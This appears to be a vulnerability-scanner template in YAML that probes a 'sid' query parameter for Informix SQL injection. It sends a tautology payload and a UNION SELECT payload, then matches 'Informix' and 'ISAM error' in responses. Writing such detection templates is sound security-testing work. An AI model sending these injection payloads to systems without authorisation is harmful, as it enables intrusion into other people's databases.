id: sqli6-informix-05
name: 'SQLi informix probe in sid'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via sid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sid:
        - '" OR "1"="1'
        - ''' UNION SELECT NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
